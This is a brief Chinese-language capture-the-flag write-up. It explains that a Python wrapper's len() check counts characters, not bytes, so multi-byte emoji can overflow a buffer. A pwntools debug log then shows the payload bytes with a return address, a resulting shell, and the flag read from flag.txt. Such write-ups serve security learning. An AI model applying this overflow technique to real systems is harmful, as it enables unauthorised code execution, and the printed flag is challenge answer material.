# 考点
Python字符串的特性利用：这个检查只是检查字符串的长度（len(payload)），而不是字节大小。
在Python 3中，字符串是Unicode字符，某些Unicode字符（如表情符号或多字节字符）在内存中可能占用多个字节
但在Python的len()函数中只计为1个长度。


# getshell
```
[DEBUG] Sent 0x121 bytes:
    00000000  00 00 00 00  00 00 00 00  f0 9f 98 80  f0 9f 98 80  │····│····│····│····│
    00000010  f0 9f 98 80  f0 9f 98 80  f0 9f 98 80  f0 9f 98 80  │····│····│····│····│
    *
    00000110  f0 9f 98 80  f0 9f 98 80  6a 12 40 00  00 00 00 00  │····│····│j·@·│····│
    00000120  0a                                                  │·│
    00000121
[*] Switching to interactive mode
$ ls
[DEBUG] Sent 0x3 bytes:
    b'ls\n'
[DEBUG] Received 0x1a bytes:
    b'chall\n'
    b'flag.txt\n'
    b'wrapper.py\n'
chall
flag.txt
wrapper.py
$ cat flag.txt
[DEBUG] Sent 0xd bytes:
    b'cat flag.txt\n'
[DEBUG] Received 0x23 bytes:
    b'L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}'
L3AK{6375_15_4pp4r3n7ly_n3v3r_54f3}$

```
![](https://r2.20161023.xyz/pic/20250712115355824.png)
